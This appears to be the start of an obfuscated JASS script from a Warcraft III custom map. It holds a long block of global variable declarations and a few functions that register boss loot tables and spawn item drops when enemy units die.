//W3x2lni Data: 2020-12-06 20:25:51.146
globals
hashtable MF=InitHashtable()
integer array MS
boolean array MX
trigger Md=CreateTrigger()
hashtable M0=InitHashtable()
integer array My
integer Mz=0
hashtable Mw=InitHashtable()
integer array Mu
integer Mv=1
hashtable Ms=InitHashtable()
integer array Mq
integer Mr=0
string M3="Q}W{9zx/.2q]J[0Z?X>4_IYRO5c,yL8e=rpoD:C<VM6~TEPU`1Bn+3uvitNb!a'@A;#Sl$ms%kjfG^gh&K7*Fw(Hd)-"
integer M1=5
trigger M7=CreateTrigger()
trigger M9=CreateTrigger()
trigger array M8 
trigger array NB
unit array NC
trigger ND
boolean array NO
unit Nh
hashtable Nn=InitHashtable()
integer array Ns
trigger NP=CreateTrigger()
integer OF
boolean array OP
integer array OG
integer array OI
integer array OX
real ON
real OO
integer array OY
integer OQ=$41314136
trigger OJ
trigger OK
trigger OL
trigger OM
trigger PG
boolean OZ=true
integer OH=4
unit array PE
string PF
string PD="Q}W{9zx/.2q]J[0Z?X>4_IYRO5c,yL8e=rpoD:C<VM6~TEPU`1Bn+3uvitNb!a'@A;#Sl$ms%kjfG^gh&K7*Fw(Hd)-"
string array Os
unit Wu=null
integer array QI
unit Wk=null
location Wl=null
integer QJ=0
real QK=0
group QL=null
integer QM=0
integer QN=0
quest array YX
location array Y0
integer QO=0
integer array QP
unit array Wi
location array ZV
boolean QQ=false
integer QR=0
integer QS=0
real QT=0
real QU=0
real QV=0
real QW=0
boolean QX=false
integer QY=0
integer QZ=0
real Qa=0
real Qb=0
string Qc
boolean Qd=false
player array h6
boolean Qe=false
real array Qf
boolean Qg=false
integer array Qh
integer Qi=0
real Qj=0
timer Qk=null
integer array Ql
integer array Qm
integer array Qn
boolean Qo=false
boolean Qp=false
unit array h7
integer array Qq
real array Qr
integer array Qs
integer array Qt
integer Qu=0
integer array Qv
real array Qw
real array Qx
integer array Qy
real array Qz
boolean array Q0
integer array Q1
integer array Q2
integer Q3=0
real array Q4
boolean array Q5
integer array Q6
unit array h8
integer array Q7
integer Q8=0
real array Q9
boolean array RB
integer array RC
timer array RD
integer array RE
integer array RF
integer array RG
integer RH=0
integer RI=0
integer RJ=0
integer array RK
real array RL
integer array RM
integer array RN
integer array RO
integer array RP
unit Wt=null
location Wv=null
location Ww=null
location Wz=null
integer array RQ
integer array RR
integer array RS
real array RT
real array RU
real array RV
unit array WD
location array WE
unit array XD
group array RW
unit array WF
boolean array RX
timer RY=null
location array XF
location array W7
integer array RZ
button array Xs
texttag array Z1
string array Ra
group Rb=null
timer Rc=null
group Rd=null
timer Re=null
group Rf=null
integer Rg=0
integer Rh=0
timer Ri=null
integer Rj=0
integer Rk=0
real Rl=0
integer Rm=0
real Rn=0
unit array VR
unit array NL
multiboard Pb=null
integer array Ro
integer array Rp
integer array Rq
real array Rr
unit array WS
location array WR
real array Rs
real Rt=0
real array Ru
integer Rv=0
real array Rw
integer array Rx
real array Ry
group array Rz
boolean array R0
unit array XQ
location array XR
timer R1=null
integer XT=0
location XU=null
group R2=null
integer R3=0
unit array XV
location array XW
real array R4
integer R5=0
boolean array R6
timer R7=null
integer XY=0
integer MK=0
integer array R8
integer R9=0
location array YV
real SB=0
location array fu
location array fv
unit array fw
location array f2
unit array f3
location array f4
integer array SC
integer SD=0
integer array SE
integer SF=0
integer array SG
boolean array SH
group SI=null
real array SJ
real array SK
effect array Us
boolean array SL
integer array SM
unit array MT
integer SN=0
timer SO=null
unit array Xp
integer SP=0
integer SQ=0
group SR=null
integer SS=0
group array ST
integer SU=0
unit array Wh
boolean array SV
timer SW=null
integer array SX
boolean SY=false
integer SZ=0
integer Sa=0
location V0=null
string array Sb
integer Sc=0
location WX=null
integer Sd=0
real array Se
integer Sf=0
integer Sg=0
unit fS=null
location array fU
unit array fV
integer array Sh
location array fZ
location array fa
integer Si=0
integer Sj=0
integer Sk=0
integer Sl=0
integer Sm=0
integer Sn=0
integer So=0
integer array Sp
unit gS=null
integer array Sq
location Vz=null
boolean array Sr
integer Ss=0
integer St=0
boolean array Su
integer array Sv
boolean array Sw
location array Wa
unit array Wb
location array Wc
integer array Sx
boolean array Sy
integer Sz=0
unit array Nc
boolean array S0
integer S1=0
boolean array S2
boolean array S3
integer S4=0
group array S5
timer array S6
integer array S7
timer S8=null
timer S9=null
group TB=null
integer TC=0
boolean array TD
integer array TE
integer TF=0
integer TG=0
integer TH=0
integer array TI
integer array NJ
integer array NK
integer TJ=0
location array b6
integer array TK
integer array TL
integer array TM
integer array TN
boolean TO=false
integer TP=0
unit array gV
location array gW
real array Ng
real array N0
real array TQ
real array Nd
real array Nf
integer array TR
integer array TS
unit array WO
integer TT=0
location array WP
group array TU
boolean array Ni
integer array TV
integer array TW
integer TX=0
integer array TY
integer TZ=0
integer array Ta
integer array Tb
integer array Tc
integer array Td
unit dy=null
integer Te=0
boolean array Tf
integer array Tg
effect array WM
location Ub=null
group Th=null
integer Ti=0
integer array Tj
integer array Tk
location array Xm
group array Tl
integer array Tm
integer Tn=0
group To=null
group Tp=null
group array Tq
unit array W2
unit array W1
integer Tr=0
boolean array Ts
real array Tt
integer Tu=0
integer Tv=0
unit W4=null
timer array Tw
boolean array Tx
location array WK
unit array WI
group array Ty
integer Tz=0
integer array T0
integer T1=0
boolean array T2
integer T3=0
boolean array T4
integer array T5
integer T6=0
integer array T7
timer T8=null
integer T9=0
integer UB=0
integer UC=0
integer UD=0
integer array UE
string UF
integer array UG
integer array UH
integer array UI
integer array UJ
integer array UK
integer array UL
integer array UM
multiboard array OC
group array UN
dialog UO=null
integer array UP
integer array UQ
rect H=null
rect I=null
rect J=null
rect K=null
rect L=null
rect M=null
rect N=null
rect O=null
rect P=null
rect Q=null
rect R=null
rect S=null
rect T=null
rect U=null
rect V=null
rect W=null
rect X=null
rect Y=null
rect Z=null
rect a=null
rect b=null
rect c=null
rect d=null
rect e=null
rect f=null
rect g=null
rect h=null
rect i=null
rect j=null
rect k=null
rect l=null
rect m=null
rect n=null
rect o=null
rect p=null
rect q=null
rect r=null
rect s=null
rect t=null
rect u=null
rect v=null
rect w=null
rect x=null
rect y=null
rect z=null
rect BB=null
rect BC=null
rect BD=null
rect BE=null
rect BF=null
rect BG=null
rect BH=null
rect BI=null
rect BJ=null
rect BK=null
rect BL=null
rect BM=null
rect BN=null
rect BO=null
rect BP=null
rect BQ=null
rect BR=null
rect BS=null
rect BT=null
rect BU=null
rect BV=null
rect BW=null
rect BX=null
rect BY=null
rect BZ=null
rect Ba=null
rect Bb=null
rect Bc=null
rect Bd=null
rect Be=null
rect Bf=null
rect Bg=null
rect Bh=null
rect Bi=null
rect Bj=null
rect Bk=null
rect Bl=null
rect Bm=null
rect Bn=null
rect Bo=null
rect Bp=null
rect Bq=null
rect Br=null
rect Bs=null
rect Bt=null
rect Bu=null
rect Bv=null
rect Bw=null
rect Bx=null
rect By=null
rect Bz=null
rect B0=null
rect B1=null
rect B2=null
rect B3=null
rect B4=null
rect B5=null
rect B6=null
rect B7=null
rect B8=null
rect B9=null
rect CB=null
rect CC=null
rect CD=null
rect CE=null
rect CF=null
rect CG=null
rect CH=null
rect CI=null
rect CJ=null
rect CK=null
rect CL=null
rect CM=null
rect CN=null
rect CO=null
rect CP=null
rect CQ=null
rect CR=null
rect CS=null
rect CT=null
rect CU=null
rect CV=null
rect CW=null
rect CX=null
rect CY=null
rect CZ=null
rect Ca=null
rect Cb=null
rect Cc=null
rect Cd=null
rect Ce=null
rect Cf=null
rect Cg=null
rect Ch=null
rect Ci=null
rect Cj=null
rect Ck=null
rect Cl=null
rect Cm=null
rect Cn=null
rect Co=null
rect Cp=null
rect Cq=null
rect Cr=null
rect Cs=null
rect Ct=null
rect Cu=null
rect Cv=null
rect Cw=null
rect Cx=null
rect Cy=null
rect Cz=null
rect C0=null
rect C1=null
rect C2=null
rect C3=null
rect C4=null
rect C5=null
rect C6=null
rect C7=null
rect C8=null
rect C9=null
rect DB=null
rect DC=null
rect DD=null
rect DE=null
rect DF=null
rect DG=null
rect DH=null
rect DI=null
rect DJ=null
rect DK=null
rect DL=null
rect DM=null
rect DN=null
rect DO=null
rect DP=null
rect DQ=null
rect DR=null
rect DS=null
rect DT=null
rect DU=null
rect DV=null
rect DW=null
rect DX=null
rect DY=null
rect DZ=null
rect Da=null
rect Db=null
rect Dc=null
rect Dd=null
rect De=null
rect Df=null
rect Dg=null
rect Dh=null
rect Di=null
rect Dj=null
rect Dk=null
rect Dl=null
rect Dm=null
rect Dn=null
rect Do=null
rect Dp=null
rect Dq=null
rect Dr=null
rect Ds=null
rect Dt=null
rect Du=null
rect Dv=null
rect Dw=null
rect Dx=null
rect Dy=null
rect Dz=null
rect D0=null
rect D1=null
rect D2=null
rect D3=null
rect D4=null
rect D5=null
rect D6=null
rect D7=null
rect D8=null
rect D9=null
rect EB=null
rect EC=null
rect ED=null
rect EE=null
rect EF=null
rect EG=null
rect EH=null
rect EI=null
rect EJ=null
rect EK=null
rect EL=null
rect EM=null
rect EN=null
rect EO=null
rect EP=null
rect EQ=null
rect ER=null
rect ES=null
rect ET=null
rect EU=null
rect EV=null
rect EW=null
rect EX=null
rect EY=null
rect EZ=null
rect Ea=null
rect Eb=null
rect Ec=null
rect Ed=null
rect Ee=null
rect Ef=null
rect Eg=null
rect Eh=null
rect Ei=null
rect Ej=null
rect Ek=null
rect El=null
rect Em=null
rect En=null
rect Eo=null
rect Ep=null
rect Eq=null
rect Er=null
rect Es=null
rect Et=null
rect Eu=null
rect Ev=null
rect Ew=null
rect Ex=null
rect Ey=null
rect Ez=null
rect E0=null
rect E1=null
rect E2=null
rect E3=null
rect E4=null
rect E5=null
rect E6=null
rect E7=null
rect E8=null
rect E9=null
rect FB=null
rect FC=null
rect FD=null
rect FE=null
rect FF=null
rect FG=null
rect FH=null
rect FI=null
rect FJ=null
rect FK=null
rect FL=null
rect FM=null
rect FN=null
rect FO=null
rect FP=null
rect FQ=null
rect FR=null
rect FS=null
rect FT=null
rect FU=null
rect FV=null
rect FW=null
rect FX=null
rect FY=null
rect FZ=null
rect Fa=null
rect Fb=null
rect Fc=null
rect Fd=null
rect Fe=null
rect Ff=null
rect Fg=null
rect Fh=null
rect Fi=null
rect Fj=null
rect Fk=null
rect Fl=null
rect Fm=null
rect Fn=null
rect Fo=null
rect Fp=null
rect Fq=null
rect Fr=null
rect Fs=null
rect Ft=null
rect Fu=null
rect Fv=null
rect Fw=null
rect Fx=null
rect Fy=null
rect Fz=null
rect F0=null
rect F1=null
rect F2=null
rect F3=null
rect F4=null
rect F5=null
rect F6=null
rect F7=null
rect F8=null
rect F9=null
rect GB=null
rect GC=null
rect GD=null
rect GE=null
rect GF=null
rect GG=null
rect GH=null
rect GI=null
rect GJ=null
rect GK=null
rect GL=null
rect GM=null
rect GN=null
rect GO=null
rect GP=null
rect GQ=null
rect GR=null
rect GS=null
rect GT=null
rect GU=null
rect GV=null
rect GW=null
rect GX=null
rect GY=null
rect GZ=null
rect Ga=null
rect Gb=null
rect Gc=null
rect Gd=null
rect Ge=null
rect Gf=null
rect Gg=null
rect Gh=null
rect Gi=null
rect Gj=null
rect Gk=null
rect Gl=null
rect Gm=null
rect Gn=null
rect Go=null
rect Gp=null
rect Gq=null
rect Gr=null
rect Gs=null
rect Gt=null
rect Gu=null
rect Gv=null
rect Gw=null
rect Gx=null
rect Gy=null
rect Gz=null
rect G0=null
camerasetup G2=null
camerasetup G3=null
camerasetup G4=null
camerasetup G5=null
camerasetup G6=null
camerasetup G7=null
sound C=null
sound D=null
sound E=null
sound F=null
sound G=null
trigger PI=null
trigger Ua=null
trigger U9=null
trigger Vy=null
trigger WB=null
trigger WC=null
trigger WG=null
trigger WH=null
trigger WJ=null
trigger WL=null
trigger WN=null
trigger WQ=null
trigger WT=null
trigger WU=null
trigger WV=null
trigger WW=null
trigger WY=null
trigger WZ=null
trigger Wd=null
trigger We=null
trigger Wf=null
trigger Wg=null
trigger Wj=null
trigger Wm=null
trigger Wn=null
trigger Wo=null
trigger Wp=null
trigger Wr=null
trigger Ws=null
trigger Wx=null
trigger Wy=null
trigger W0=null
trigger W3=null
trigger W5=null
trigger W6=null
trigger W8=null
trigger W9=null
trigger XB=null
trigger XC=null
trigger XE=null
trigger XG=null
trigger XH=null
trigger XI=null
trigger XJ=null
trigger XK=null
trigger XL=null
trigger XN=null
trigger XO=null
trigger XP=null
trigger XS=null
trigger XX=null
trigger XZ=null
trigger Xa=null
trigger Xb=null
trigger Xc=null
trigger Xd=null
trigger Xe=null
trigger Xi=null
trigger Xj=null
trigger Xk=null
trigger Xl=null
trigger Xn=null
trigger Xv=null
trigger X2=null
trigger YE=null
trigger YF=null
trigger YG=null
trigger YO=null
trigger YR=null
trigger YS=null
trigger YT=null
trigger YU=null
trigger YW=null
trigger YY=null
trigger YZ=null
trigger Ya=null
trigger Yb=null
trigger Yc=null
trigger Yd=null
trigger Ye=null
trigger Yf=null
trigger Yg=null
trigger Yh=null
trigger Yi=null
trigger Yk=null
trigger Yj=null
trigger Yl=null
trigger Ym=null
trigger Yn=null
trigger Vf=null
trigger Yo=null
trigger Yp=null
trigger Ve=null
trigger Yq=null
trigger Yr=null
trigger Ys=null
trigger Yt=null
trigger Yu=null
trigger Yv=null
trigger Yw=null
trigger Yx=null
trigger Yz=null
trigger Yy=null
trigger Y1=null
trigger Y2=null
trigger Y3=null
trigger Y4=null
trigger Y5=null
trigger Y6=null
trigger Y7=null
trigger Y8=null
trigger Y9=null
trigger ZB=null
trigger ZC=null
trigger ZD=null
trigger ZE=null
trigger ZF=null
trigger ZG=null
trigger ZH=null
trigger ZI=null
trigger ZJ=null
trigger ZK=null
trigger ZL=null
trigger ZM=null
trigger ZN=null
trigger ZO=null
trigger ZP=null
trigger ZQ=null
trigger ZR=null
trigger ZS=null
trigger ZT=null
trigger ZU=null
trigger ZW=null
trigger ZX=null
trigger ZY=null
trigger ZZ=null
trigger Za=null
trigger Zb=null
trigger Ze=null
trigger Zc=null
trigger Zd=null
trigger Zf=null
trigger Zg=null
trigger Zh=null
trigger Zi=null
trigger Zj=null
trigger Zk=null
trigger Zl=null
trigger Zm=null
trigger Zn=null
trigger Zo=null
trigger Zp=null
trigger Zs=null
trigger Zt=null
trigger Zu=null
trigger Zv=null
trigger Zw=null
trigger Zx=null
trigger Zy=null
trigger Zz=null
trigger Z0=null
trigger Z6=null
trigger Z5=null
trigger Z4=null
trigger Z3=null
trigger Z2=null
trigger Z7=null
trigger Z8=null
trigger Z9=null
trigger aB=null
trigger aC=null
trigger aD=null
trigger aE=null
trigger aF=null
trigger aG=null
trigger aH=null
trigger aI=null
trigger aJ=null
trigger aK=null
trigger aL=null
trigger aM=null
trigger aN=null
trigger aO=null
trigger aP=null
trigger aQ=null
trigger aR=null
trigger aS=null
trigger aT=null
trigger aU=null
trigger aV=null
trigger aW=null
trigger aX=null
trigger aY=null
trigger aZ=null
trigger aa=null
trigger ab=null
trigger ac=null
trigger ad=null
trigger ae=null
trigger af=null
trigger ag=null
trigger ah=null
trigger aj=null
trigger ak=null
trigger al=null
trigger am=null
trigger an=null
trigger ao=null
trigger aq=null
trigger ap=null
trigger ar=null
trigger Vi=null
trigger as=null
trigger at=null
trigger au=null
trigger av=null
trigger ax=null
trigger aw=null
trigger az=null
trigger ai=null
trigger a0=null
trigger a1=null
trigger a2=null
trigger a3=null
trigger a4=null
trigger a5=null
trigger a6=null
trigger a7=null
trigger a8=null
trigger a9=null
trigger bC=null
trigger bB=null
trigger bD=null
trigger bE=null
trigger bF=null
trigger bG=null
trigger bH=null
trigger bI=null
trigger bJ=null
trigger bK=null
trigger bL=null
trigger Vj=null
trigger bM=null
trigger bN=null
trigger bO=null
trigger bP=null
trigger bQ=null
trigger bR=null
trigger bS=null
trigger bT=null
trigger bU=null
trigger bV=null
trigger bW=null
trigger bX=null
trigger bY=null
trigger bZ=null
trigger bb=null
trigger ba=null
trigger bc=null
trigger bd=null
trigger bf=null
trigger be=null
trigger bg=null
trigger bh=null
trigger bi=null
trigger bj=null
trigger bk=null
trigger bl=null
trigger bm=null
trigger bn=null
trigger bo=null
trigger bp=null
trigger bq=null
trigger bs=null
trigger br=null
trigger bt=null
trigger bu=null
trigger bv=null
trigger bw=null
trigger bx=null
trigger by=null
trigger bz=null
trigger b0=null
trigger b1=null
trigger b5=null
trigger b2=null
trigger b3=null
trigger b4=null
trigger b7=null
trigger b8=null
trigger b9=null
trigger cB=null
trigger cC=null
trigger cD=null
trigger cE=null
trigger cF=null
trigger cG=null
trigger cH=null
trigger cI=null
trigger cJ=null
trigger cK=null
trigger cL=null
trigger cM=null
trigger cN=null
trigger cO=null
trigger cP=null
trigger cQ=null
trigger cR=null
trigger cS=null
trigger cT=null
trigger cU=null
trigger cV=null
trigger cW=null
trigger cX=null
trigger cY=null
trigger cZ=null
trigger ca=null
trigger cb=null
trigger cc=null
trigger cd=null
trigger ce=null
trigger cf=null
trigger cg=null
trigger ch=null
trigger ci=null
trigger cj=null
trigger ck=null
trigger cl=null
trigger cm=null
trigger cn=null
trigger co=null
trigger cp=null
trigger cq=null
trigger cr=null
trigger cs=null
trigger ct=null
trigger cu=null
trigger cv=null
trigger cw=null
trigger cx=null
trigger cy=null
trigger cz=null
trigger c1=null
trigger c2=null
trigger c3=null
trigger c4=null
trigger c5=null
trigger c6=null
trigger c7=null
trigger c8=null
trigger c9=null
trigger dB=null
trigger dC=null
trigger dD=null
trigger dE=null
trigger Uz=null
trigger dG=null
trigger Ur=null
trigger dH=null
trigger dI=null
trigger dJ=null
trigger dK=null
trigger dS=null
trigger dT=null
trigger dU=null
trigger dV=null
trigger dW=null
trigger dX=null
trigger dY=null
trigger dZ=null
trigger da=null
trigger db=null
trigger dc=null
trigger dd=null
trigger de=null
trigger dg=null
trigger dh=null
trigger di=null
trigger dk=null
trigger dl=null
trigger dm=null
trigger dn=null
trigger do=null
trigger dp=null
trigger dq=null
trigger dr=null
trigger ds=null
trigger dt=null
trigger du=null
trigger Uq=null
trigger dv=null
trigger dw=null
trigger dx=null
trigger dz=null
trigger d0=null
trigger Ux=null
trigger d1=null
trigger d3=null
trigger d4=null
trigger d6=null
trigger d7=null
trigger ee=null
trigger ef=null
trigger eg=null
trigger eh=null
trigger ei=null
trigger ej=null
trigger ek=null
trigger el=null
trigger em=null
trigger en=null
trigger eo=null
trigger ep=null
trigger eq=null
trigger er=null
trigger es=null
trigger et=null
trigger eu=null
trigger ev=null
trigger ew=null
trigger Un=null
trigger Uy=null
trigger ex=null
trigger ey=null
trigger ez=null
trigger e0=null
trigger e1=null
trigger e2=null
trigger e3=null
trigger e4=null
trigger e5=null
trigger e6=null
trigger e7=null
trigger e8=null
trigger e9=null
trigger fB=null
trigger fC=null
trigger fD=null
trigger fF=null
trigger fG=null
trigger fH=null
trigger fI=null
trigger fJ=null
trigger fK=null
trigger fL=null
trigger fM=null
trigger fN=null
trigger fO=null
trigger fQ=null
trigger fR=null
trigger fP=null
trigger fT=null
trigger fW=null
trigger fX=null
trigger fY=null
trigger fb=null
trigger fc=null
trigger fd=null
trigger fe=null
trigger ff=null
trigger jK=null
trigger fh=null
trigger fi=null
trigger hx=null
trigger h1=null
trigger h0=null
trigger ft=null
trigger fx=null
trigger fy=null
trigger fz=null
trigger f0=null
trigger f1=null
trigger f5=null
trigger f6=null
trigger eP=null
trigger f7=null
trigger f8=null
trigger f9=null
trigger gB=null
trigger gC=null
trigger gI=null
trigger gD=null
trigger gE=null
trigger gH=null
trigger gF=null
trigger gG=null
trigger eO=null
trigger Uu=null
trigger gK=null
trigger hW=null
trigger eW=null
trigger ea=null
trigger eX=null
trigger eb=null
trigger gN=null
trigger gO=null
trigger gP=null
trigger gQ=null
trigger h2=null
trigger gR=null
trigger gT=null
trigger gU=null
trigger gX=null
trigger gb=null
trigger gc=null
trigger gd=null
trigger ge=null
trigger gf=null
trigger gg=null
trigger gh=null
trigger gi=null
trigger eD=null
trigger gj=null
trigger gk=null
trigger gl=null
trigger eE=null
trigger gm=null
trigger gn=null
trigger eF=null
trigger go=null
trigger gp=null
trigger gq=null
trigger gs=null
trigger gv=null
trigger gw=null
trigger gz=null
trigger g0=null
trigger d9=null
trigger hK=null
trigger hQ=null
trigger hT=null
trigger hU=null
trigger hV=null
trigger ec=null
trigger ed=null
trigger eN=null
trigger eU=null
trigger eZ=null
trigger eL=null
trigger eR=null
trigger eT=null
trigger eJ=null
trigger eH=null
trigger eC=null
trigger ha=null
trigger hb=null
trigger hc=null
trigger hd=null
trigger he=null
trigger hf=null
trigger hg=null
trigger hh=null
trigger U0=null
trigger U2=null
trigger U1=null
trigger hi=null
trigger hj=null
trigger hk=null
trigger hl=null
trigger hm=null
trigger hn=null
trigger ho=null
trigger Ut=null
trigger Uh=null
trigger Uv=null
trigger hp=null
trigger Uw=null
trigger hq=null
trigger hr=null
trigger hs=null
trigger ht=null
trigger hu=null
trigger Vg=null
trigger Vh=null
trigger Ug=null
trigger hv=null
trigger Zq=null
trigger Zr=null
trigger eM=null
trigger eV=null
trigger eY=null
trigger eK=null
trigger eQ=null
trigger eS=null
trigger eI=null
trigger eG=null
trigger eB=null
trigger jL=null
trigger h5=null
trigger jM=null
trigger jN=null
trigger h9=null
trigger iZ=null
trigger ia=null
trigger ib=null
trigger Uk=null
trigger Uj=null
trigger Ui=null
trigger Up=null
trigger Uo=null
trigger Um=null
trigger Ul=null
trigger ic=null
trigger jO=null
trigger iq=null
trigger ir=null
trigger is=null
trigger it=null
trigger iu=null
trigger iv=null
trigger iw=null
trigger VS=null
trigger VW=null
trigger VT=null
trigger VU=null
trigger VV=null
trigger dj=null
trigger ix=null
trigger iy=null
trigger iz=null
trigger i1=null
trigger i7=null
trigger i8=null
trigger i9=null
trigger jB=null
trigger jC=null
trigger ay=null
trigger jD=null
trigger jE=null
trigger jF=null
trigger jG=null
trigger jH=null
trigger jI=null
trigger jJ=null
unit JR=null
unit ID=null
unit Kj=null
unit KU=null
unit KT=null
unit KS=null
unit KR=null
unit Ic=null
unit Kc=null
unit K9=null
unit KZ=null
unit KQ=null
unit KP=null
unit Kt=null
unit IY=null
unit K1=null
unit Id=null
unit KH=null
unit IX=null
unit Jd=null
unit KK=null
unit Ko=null
unit KJ=null
unit KI=null
unit K2=null
unit Hw=null
unit IW=null
unit Iz=null
unit I0=null
unit Ie=null
unit KV=null
unit Kh=null
unit LN=null
unit K7=null
unit H2=null
unit Lg=null
unit H7=null
unit H9=null
unit IN=null
unit Jf=null
unit Kk=null
unit In=null
unit KY=null
unit JQ=null
unit H8=null
unit Ls=null
unit Jn=null
unit L4=null
unit Ia=null
unit Ku=null
unit Ig=null
unit Ih=null
unit Ke=null
unit Ij=null
unit H6=null
unit JP=null
unit K5=null
unit KX=null
unit IL=null
unit H1=null
unit IB=null
unit IJ=null
unit Kg=null
unit Kn=null
unit K4=null
unit Hz=null
unit IK=null
unit Hy=null
unit Il=null
unit Ik=null
unit Lq=null
unit Is=null
unit Kd=null
unit H0=null
unit K3=null
unit IP=null
unit IO=null
unit J8=null
unit LF=null
unit LG=null
unit Iw=null
unit If=null
unit Lk=null
unit Jp=null
unit H4=null
unit Ju=null
unit Iu=null
unit J9=null
unit Ji=null
unit LH=null
unit JO=null
unit LK=null
unit LJ=null
unit Ib=null
unit Kw=null
unit L6=null
unit LD=null
unit Im=null
unit J4=null
unit KM=null
unit LO=null
unit I3=null
unit LL=null
unit LM=null
unit Kf=null
unit LQ=null
unit KG=null
unit KD=null
unit I1=null
unit Kv=null
unit Ky=null
unit LB=null
unit Js=null
unit Jk=null
unit Ld=null
unit H3=null
unit LT=null
unit IC=null
unit IG=null
unit Kz=null
unit LV=null
unit Hx=null
unit IE=null
unit IF=null
unit Lf=null
unit Le=null
unit Lc=null
unit JN=null
unit JM=null
unit Km=null
unit LS=null
unit Kq=null
unit Ka=null
unit Li=null
unit Lh=null
unit IM=null
unit Lb=null
unit La=null
unit LZ=null
unit LY=null
unit LX=null
unit Kr=null
unit Hv=null
unit LU=null
unit LR=null
unit Jg=null
unit LW=null
unit JL=null
unit JK=null
unit JJ=null
unit JI=null
unit JH=null
unit JG=null
unit JF=null
unit JE=null
unit JC=null
unit JB=null
unit I9=null
unit I8=null
unit Ir=null
unit Iq=null
unit J7=null
unit K8=null
unit Jl=null
unit Lm=null
unit It=null
unit Je=null
unit Lt=null
unit Jj=null
unit Kx=null
unit KE=null
unit Ii=null
unit Ll=null
unit Lz=null
unit Io=null
unit H5=null
unit K6=null
unit LE=null
unit I7=null
unit I6=null
unit Lp=null
unit JT=null
unit LI=null
unit JS=null
unit Jc=null
unit J3=null
unit J2=null
unit J1=null
unit J0=null
unit Jz=null
unit KB=null
unit Jy=null
unit Jx=null
unit Jw=null
unit Jv=null
unit Ly=null
unit Iv=null
unit Jq=null
unit Kl=null
unit KL=null
unit IQ=null
unit Lu=null
unit Ln=null
unit Ki=null
unit L0=null
unit L2=null
unit Ja=null
unit KN=null
unit Jo=null
unit L5=null
unit JU=null
unit II=null
unit IH=null
unit Kb=null
unit I4=null
unit Jh=null
unit Jm=null
unit Lv=null
unit Lw=null
unit Lx=null
unit L1=null
unit L3=null
unit Iy=null
unit J6=null
unit JV=null
unit J5=null
unit Kp=null
unit Ix=null
unit I5=null
unit LP=null
unit Lo=null
unit Lr=null
unit KO=null
unit Lj=null
unit Jb=null
unit Ip=null
unit KW=null
unit L7=null
unit JX=null
unit JW=null
unit K0=null
unit JY=null
unit KC=null
unit KF=null
unit Jt=null
unit IV=null
unit IR=null
unit IT=null
unit IS=null
unit IU=null
unit Ks=null
unit Jr=null
unit IZ=null
unit JD=null
unit JZ=null
unit LC=null
destructable HR=null
destructable HT=null
destructable HU=null
destructable Hl=null
destructable Hs=null
destructable Hk=null
destructable Hj=null
destructable Hi=null
destructable HS=null
destructable HI=null
destructable HJ=null
destructable HX=null
destructable HZ=null
destructable Hm=null
destructable HF=null
destructable HY=null
destructable HV=null
destructable HG=null
destructable Hr=null
destructable Ho=null
destructable Ha=null
destructable HH=null
destructable HN=null
destructable HL=null
destructable HP=null
destructable HK=null
destructable HQ=null
destructable HO=null
destructable HM=null
destructable HB=null
destructable Hn=null
destructable G8=null
destructable G9=null
destructable HD=null
destructable HC=null
destructable Hq=null
destructable HE=null
destructable Hh=null
destructable Hp=null
destructable HW=null
rect G1=null
real Og=7.09
string array VN
boolean array Vw
boolean array i5
integer array gu
integer array d8
integer VO
string array hP
integer array hM
real array dF
hashtable dM=InitHashtable()
integer Nu
effect array V4
hashtable PP=InitHashtable()
hashtable Nq=InitHashtable()
unit Pq
hashtable fj=InitHashtable()
integer array fo
integer array fg
boolean array VQ
integer array hI
string V5
hashtable YN=InitHashtable()
integer array Xq
dialog array Xr
integer Xz
integer X0
string array OE
boolean NF=true
timer Pn=CreateTimer()
dialog Pm=DialogCreate()
string PH="1234567890AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz-_)(/."
integer N5
string array OD
string array PR
boolean array Pp
integer array Po
location Pr
unit YJ
unit array UZ
unit array Nw
integer array Nx
unit array Vd
integer array Nz
hashtable Vc=InitHashtable()
hashtable NY=InitHashtable()
integer NZ
integer array Mb
trigger gZ=CreateTrigger()
trigger h3=CreateTrigger()
image array g2
integer array ga
string array g7
group array V1
group array V2
integer array Ps
string array MP
integer MQ
hashtable B8F=InitHashtable()
string array Pi
integer Vt
integer Vv
string Vu
integer Pj
hashtable fl=InitHashtable()
unit array gY
hashtable g1=InitHashtable()
hashtable gt=InitHashtable()
integer hC=0
integer array hD
real array hE
integer P8=0
integer array P9
integer array QB
string array QD
multiboard ij
item QH
integer Mm=0
integer Mo=0
integer array Mn
integer array MM
integer array MN
integer array MH
real array MI
integer array MJ
string array Mi
integer array Mj
sound array Mk
integer array Ml
endglobals
native UnitAlive takes unit id returns boolean
function jP takes nothing returns integer
local integer Me=Mm
if Me!=0 then
set Mm=Mn[Me]
else
set Mo=Mo+1
set Me=Mo
endif
if Me>80 then
call DisplayTimedTextToPlayer(GetLocalPlayer(),0,0,1000.,"Unable to allocate id for an object of type: BossLoot")
return 0
endif
set MN[Me]=(Me-1)*100
set MJ[Me]=(Me-1)*100
set Mj[Me]=(Me-1)*100
set Ml[Me]=(Me-1)*100
set MH[Me]=-1
set Mn[Me]=-1
return Me
endfunction
function jQ takes item MO returns nothing
call TriggerSleepAction(.1)
set MP[MQ]=GetItemName(MO)
set MQ=MQ+1
endfunction
function jR takes integer Ma returns integer
local integer Me=jP()
call SaveInteger(MF,Ma,0,Me)
return Me
endfunction
function jS takes integer Me,integer Ma,integer Mf,string Mg,sound Mh returns integer
set MH[Me]=MH[Me]+1
set MM[MN[Me]+MH[Me]]=Ma
set MI[MJ[Me]+MH[Me]]=Mf
set Mi[Mj[Me]+MH[Me]]=Mg
set Mk[Ml[Me]+MH[Me]]=Mh
return Me
endfunction
function jT takes nothing returns nothing
local unit MB=GetTriggerUnit()
local integer L9
local integer MC=GetUnitTypeId(MB)
local real MD=GetUnitX(MB)
local real ME=GetUnitY(MB)
local item ML
local integer MG
if HaveSavedInteger(MF,MC,0) and not IsUnitIllusion(MB) and GetOwningPlayer(MB)==Player(11) then
set MG=LoadInteger(MF,MC,0)
set L9=0
loop
exitwhen L9>MH[MG]
if GetRandomInt(0,100)<=MI[MJ[MG]+L9]*MK then
set ML=CreateItem(MM[MN[MG]+L9],MD,ME)
call jQ(ML)
endif
set L9=L9+1
endloop
endif
set MB=null
set ML=null
endfunction
function jU takes nothing returns nothing
local integer L9
local trigger L8=CreateTrigger()
set L9=0
loop
exitwhen L9>=bj_MAX_PLAYER_SLOTS
